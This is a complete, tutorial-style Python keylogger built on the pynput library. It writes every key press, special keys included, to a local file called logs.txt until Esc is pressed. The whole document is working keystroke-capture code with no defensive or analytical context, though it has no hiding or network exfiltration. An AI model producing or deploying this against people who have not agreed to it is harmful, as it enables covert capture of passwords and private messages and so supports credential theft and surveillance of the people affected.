# Import the keyboard module from pynput package
from pynput import keyboard

# Specify the file name where keystrokes will be logged
keystroke_log = "logs.txt"

# Define a function to handle keypress events
def capture_key_press(key):
    # Open the log file in append mode
    with open(keystroke_log, "a") as log:
        # Try to process normal alphanumeric keys
        try:
            log.write(key.char)
        except AttributeError:
            # Handle special keys (space, enter, backspace, etc.)
            if key == keyboard.Key.space:
                log.write(" ")
            elif key == keyboard.Key.enter:
                log.write("\n")
            elif key == keyboard.Key.backspace:
                log.write("[Backspace]")
            else:
                log.write(f"[{key}]")

# Function to handle key release events
def handle_key_release(key):
    # If the Esc key is released, stop the keylogger
    if key == keyboard.Key.esc:
        return False

# Main function to set up the keylogger listener
def main():
    # Start listening to the keyboard events
    with keyboard.Listener(on_press=capture_key_press, on_release=handle_key_release) as listener:
        listener.join()

# Ensure the script runs only when executed directly
if __name__ == "__main__":
    main()
